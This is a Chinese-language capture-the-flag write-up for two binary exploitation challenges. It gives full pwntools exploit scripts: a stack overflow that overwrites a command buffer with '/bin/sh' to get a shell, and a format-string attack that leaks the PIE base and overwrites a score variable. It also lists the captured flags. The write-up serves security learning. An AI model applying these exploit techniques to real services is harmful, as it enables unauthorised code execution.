## who am i

基本的栈溢出：

```python title="exp.py"
from pwn import *
context(arch='i386', os='linux', log_level='info')

io = remote('127.0.0.1', 1518)
# io = process('./who_am_i')
io.recvuntil(b'Your choice: ')

io.sendline(b'2')

# 构造 payload，根据栈布局：
# buf[12] 在 ebp-0x41 (offset 0x7)
# command[7] 在 ebp-0xF (offset 0x39)
# 从 buf 到 command 的偏移 = 0x39 - 0x7 = 0x32 = 50 字节
offset = 0x32
payload = b'A' * offset + b'/bin/sh\x00'

io.send(payload)

io.recvuntil(b'Your choice: ')
io.sendline(b'1')
io.interactive()
```

![](https://raw.githubusercontent.com/darstib/public_imgs/utool/2511/21_251121-002029.png)

> [!flag] ZJUCTF{ n0w_u_know_wh@t_is_staCk_0VerfLow }
>

## 2048

使用 IDA 反汇编发现明显的格式化字符串漏洞：

```c
snprintf(buf, sizeof(buf), "> unknown cmd: %s", input);
printf(buf);
```

PIE 基址泄露

```python
io.sendline(f'%{PIE_LEAK_OFFSET}$p'.encode())
leak_addr = int(io.recvline().strip(), 16)
pie_base = leak_addr - LEAK_SUBTRACT
```

计算目标地址

```python
success_score_addr = pie_base + SUCCESS_SCORE_OFFSET
```

使用格式化字符串写入 16 到 success_score 地址：

```python
payload = b'%1c%16$n' + b'A' * (16 - len(b'%1c%16$n')) + p64(success_score_addr)
io.sendline(payload)
```

一些数据本地文件和远程似乎不太一样，来回切换比较；完整 exp：

```python title="exp.py"
from pwn import *

context.binary = elf = ELF('./target', checksec=False)
context.log_level = 'info'

HOST = '127.0.0.1'
PORT = 10250

# Offsets from objdump/nm
SCORE_OFFSET = 0x503c
SUCCESS_SCORE_OFFSET = 0x5010  
MAIN_OFFSET = 0x2508

def find_pie_leak():
    """Automatically find which format string offset contains a PIE address"""
    log.info("Scanning for PIE leak...")
    
    for offset in range(1, 100):
        try:
            io = process(['./target'], level='error')
            io.recvuntil(b'>', timeout=1)
            io.sendline(f'X%{offset}$p'.encode())
            io.recvuntil(b'X', timeout=1)
            leak_str = io.recvline().strip()
            io.close()
            
            if leak_str == b'(nil)' or not leak_str:
                continue
                
            leak_addr = int(leak_str, 16)
            
            # Check if it's a PIE address (0x55... or 0x56...)
            if (leak_addr >> 40) & 0xFF in [0x55, 0x56]:
                # Verify it's actually the main address by checking offset
                if (leak_addr & 0xFFF) >= 0x500 and (leak_addr & 0xFFF) <= 0x700:
                    log.success(f"Found PIE leak at offset {offset}: {hex(leak_addr)}")
                    pie_base = leak_addr - MAIN_OFFSET
                    log.success(f"Calculated PIE base: {hex(pie_base)}")
                    return offset, pie_base
                    
        except Exception as e:
            continue
    
    log.error("Could not find PIE leak in offsets 1-100")
    return None, None

def exploit(local=True):
    # Define offsets
    if local:
        PIE_LEAK_OFFSET = 35
        LEAK_SUBTRACT = MAIN_OFFSET # 0x2508
    else:
        PIE_LEAK_OFFSET = 55
        LEAK_SUBTRACT = 0x12e0 # _start
    if local:
        io = process(['./target'])
    else:
        io = remote(HOST, PORT)
    
    try:
        # Leak PIE base
        io.recvuntil(b'>', timeout=2)
        io.sendline(f'%{PIE_LEAK_OFFSET}$p'.encode())
        io.recvuntil(b'unknown cmd: ')
        # The response line will be like "0x56..."
        leak_str = io.recvline().strip()
        if b'nil' in leak_str:
            log.error("Leaked nil, offset might be wrong")
            return

        leak_addr = int(leak_str, 16)
        log.info(f"Leaked address: {hex(leak_addr)}")
        
        # Calculate PIE base
        pie_base = leak_addr - LEAK_SUBTRACT
        log.success(f"PIE Base: {hex(pie_base)}")
        
        score_addr = pie_base + SCORE_OFFSET
        success_score_addr = pie_base + SUCCESS_SCORE_OFFSET
        
        log.info(f"score @ {hex(score_addr)}")
        log.info(f"success_score @ {hex(success_score_addr)}")
        
        # Write to success_score
        
        payload_success = b'%1c%16$n'
        padding_success = b'A' * (16 - len(payload_success))
        final_payload_success = payload_success + padding_success + p64(success_score_addr)
        
        log.info("Sending payload to overwrite success_score to 16...")
        io.recvuntil(b'>', timeout=2)
        io.sendline(final_payload_success)
        
        # Play to reach target (16)
        log.info("Playing to reach target 16...")
        
        # Send a sequence of moves
        moves = b'w\n' * 5 + b'a\n' * 5 + b's\n' * 5 + b'd\n' * 5
        moves = moves * 10
        
        io.send(moves)
        
        try:
            start_time = time.time()
            while time.time() - start_time < 10:
                chunk = io.recv(4096, timeout=1)
                if not chunk:
                    break
                if b'flag' in chunk.lower() or b'ZJUCTF' in chunk.lower():
                    print(chunk)
                    return
        except Exception as e:
            log.warning(f"Error reading flag: {e}")
            
        io.interactive()
        
    except Exception as e:
        log.error(f"Exploit failed: {e}")
        import traceback
        traceback.print_exc()
    finally:
        io.close()

if __name__ == '__main__':
    import sys
    local = '--remote' not in sys.argv
    exploit(local=local)
```

![](https://raw.githubusercontent.com/darstib/public_imgs/utool/2511/22_251122-203744.png)

一开始检查最后有没有收到 `ZJUCTF` 纠结了一下，后面想会不会还有一步就看 `flag` 了，还真是：

> [!flag] flag{2o48_1s_E4sy_T0_pvvN-&-9MIbwamf}

在[这里](https://clickup-invite.vercel.app/)浅玩了一会，实际还是太难了：

![](https://raw.githubusercontent.com/darstib/public_imgs/utool/2511/27_251127-214856.png)